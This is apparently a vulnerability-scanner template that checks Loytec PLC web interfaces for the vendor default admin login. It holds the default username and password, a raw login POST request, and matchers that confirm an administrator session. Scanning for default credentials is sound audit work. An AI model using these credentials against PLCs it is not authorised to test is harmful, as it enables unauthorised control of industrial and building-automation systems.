id: loytec-default-password

info:
  name: Loytec PLC - Default Login
  author: biero-el-corridor
  severity: high
  description: |
    Loytec PLC web interface default login credentials were discovered.
  metadata:
    max-request: 1
    runzero-match: service["favicon.ico.image.mmh3"] == "1081604898"
    verifed: true
  tags: loytec,default-login
variables:
  username: admin
  password: loytec4u

http:
  - raw:
      - |
        POST /webui/login HTTP/1.1
        Host: {{Hostname}}
        X-Create-Session: 1
        Content-Type: application/x-www-form-urlencoded

        username={{username}}&password={{password}}&login=Login

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"sessUser":"admin"'
          - '"loggedIn":true'
        condition: and

      - type: status
        status:
          - 200

